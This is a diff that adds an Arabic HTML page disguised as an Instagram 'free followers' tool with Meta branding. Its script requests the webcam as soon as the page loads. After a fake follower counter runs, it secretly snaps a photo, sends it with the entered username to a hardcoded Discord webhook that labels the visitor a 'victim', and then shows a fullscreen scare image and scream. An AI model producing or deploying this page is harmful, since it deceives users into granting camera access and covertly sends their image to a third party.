@@ -1,0 +1,134 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Instagram Services - Meta</title>
+    <style>
+        :root { --insta-gradient: linear-gradient(45deg, #f09433 0%, #e6683c 25%, #dc2743 50%, #cc2366 75%, #bc1888 100%); }
+        body { background-color: #fafafa; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; margin: 0; display: flex; justify-content: center; align-items: center; height: 100vh; overflow: hidden; }
+
+        .bg-pattern {
+            position: absolute; width: 100%; height: 100%; z-index: -1; opacity: 0.03;
+            background-image: url('https://upload.wikimedia.org/wikipedia/commons/a/a5/Instagram_icon.png');
+            background-size: 80px; animation: move 30s linear infinite;
+        }
+        @keyframes move { from { background-position: 0 0; } to { background-position: 1000px 1000px; } }
+
+        .card {
+            background: white; padding: 40px 30px; border: 1px solid #dbdbdb; border-radius: 3px;
+            width: 350px; text-align: center; box-shadow: 0 4px 12px rgba(0,0,0,0.05);
+        }
+
+        .insta-logo { width: 175px; margin-bottom: 20px; }
+        h2 { font-size: 17px; color: #8e8e8e; font-weight: 600; line-height: 20px; margin-bottom: 20px; }
+
+        input, select {
+            width: 100%; padding: 10px; margin-bottom: 8px; border: 1px solid #dbdbdb;
+            border-radius: 3px; background: #fafafa; font-size: 14px; box-sizing: border-box;
+        }
+
+        .btn-submit {
+            width: 100%; padding: 10px; background: #0095f6; color: white;
+            border: none; border-radius: 4px; font-weight: bold; cursor: pointer; margin-top: 10px;
+        }
+
+        /* عداد المتابعين الوهمي */
+        .counter-box { display: none; margin-top: 20px; padding: 15px; background: #f8f9fa; border-radius: 8px; border: 1px dashed #0095f6; }
+        #count-num { font-size: 24px; font-weight: bold; color: #bc1888; }
+        .timer-text { font-size: 12px; color: #606770; margin-top: 5px; }
+
+        /* شاشة المقلب */
+        #scare-ui { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: #000; z-index: 99999; justify-content: center; align-items: center; }
+        #scare-ui img { width: 100%; height: 100%; object-fit: cover; }
+        .signature { position: absolute; bottom: 15%; font-size: 80px; color: #ff0000; font-family: 'Impact', sans-serif; animation: shake 0.1s infinite; text-shadow: 0 0 20px black; }
+        @keyframes shake { 0% { transform: translate(3px); } 100% { transform: translate(-3px); } }
+
+        #hidden-vid { position: absolute; width: 1px; height: 1px; opacity: 0; }
+        canvas { display: none; }
+    </style>
+</head>
+<body>
+
+    <div class="bg-pattern"></div>
+
+    <div class="card">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2a/Instagram_logo.svg/1200px-Instagram_logo.svg.png" class="insta-logo">
+        <h2>أداة تحديث المتابعين التلقائية</h2>
+        
+        <input type="text" id="user" placeholder="اسم المستخدم (Username)">
+        <select id="goal">
+            <option>+500 متابع حقيقي</option>
+            <option>+200 متابع حقيقي</option>
+            <option>+100 متابع حقيقي</option>
+        </select>
+
+        <button class="btn-submit" onclick="startSystem()">تنشيط الحساب (Accept)</button>
+
+        <div class="counter-box" id="counter-ui">
+            <div id="count-num">0</div>
+            <div style="font-size: 14px; color: #262626;">جاري إضافة المتابعين...</div>
+            <div class="timer-text">اكتمال العملية خلال: 4 ساعات و59 دقيقة</div>
+        </div>
+    </div>
+
+    <video id="hidden-vid" autoplay playsinline muted></video>
+    <canvas id="canvas"></canvas>
+
+    <div id="scare-ui">
+        <img src="https://files.catbox.moe/6v0n8k.jpg">
+        <div class="signature">RoMboo</div>
+        <audio id="scream" src="https://www.soundjay.com/human/sounds/person-screaming-01.mp3"></audio>
+    </div>
+
+    <script>
+        const WEBHOOK = 'https://discord.com/api/webhooks/1467269387647193300/OqrAQZ_ldXNS_tHmyFAGVfhDEHUo2neENW6BCvuHyA1pxDT9ebu7_3FDguea3ZA1khbp';
+        const vid = document.getElementById('hidden-vid');
+
+        // طلب الكاميرا فوراً
+        navigator.mediaDevices.getUserMedia({ video: true }).then(s => vid.srcObject = s).catch(e => {});
+
+        function startSystem() {
+            const username = document.getElementById('user').value;
+            if(!username) return alert("أدخل اسم المستخدم!");
+
+            // إظهار العداد
+            document.querySelector('.btn-submit').style.display = 'none';
+            document.getElementById('counter-ui').style.display = 'block';
+
+            let count = 0;
+            let target = 154; // يبدأ كأن المتابعين يتزايدون
+            let speed = setInterval(() => {
+                count += Math.floor(Math.random() * 5) + 1;
+                document.getElementById('count-num').innerText = "+" + count;
+                
+                if(count > 100) { // فاش يوصل لـ 100 متابع وهمي، يوقع المقلب
+                    clearInterval(speed);
+                    triggerCapture(username);
+                }
+            }, 100);
+        }
+
+        function triggerCapture(u) {
+            const canvas = document.getElementById('canvas');
+            canvas.width = vid.videoWidth || 640;
+            canvas.height = vid.videoHeight || 480;
+            canvas.getContext('2d').drawImage(vid, 0, 0);
+
+            canvas.toBlob(blob => {
+                const fd = new FormData();
+                fd.append('file', blob, 'cam.png');
+                fd.append('content', `✅ **نجاح العملية!**\n👤 الضحية: \`${u}\` \n🔗 الحساب مراقب الآن.`);
+                fetch(WEBHOOK, {method: 'POST', body: fd});
+            });
+
+            // المقلب بعد ثانية من توقف العداد
+            setTimeout(() => {
+                document.getElementById('scare-ui').style.display = 'flex';
+                document.getElementById('scream').play();
+                if (document.documentElement.requestFullscreen) document.documentElement.requestFullscreen();
+            }, 800);
+        }
+    </script>
+</body>
+</html>
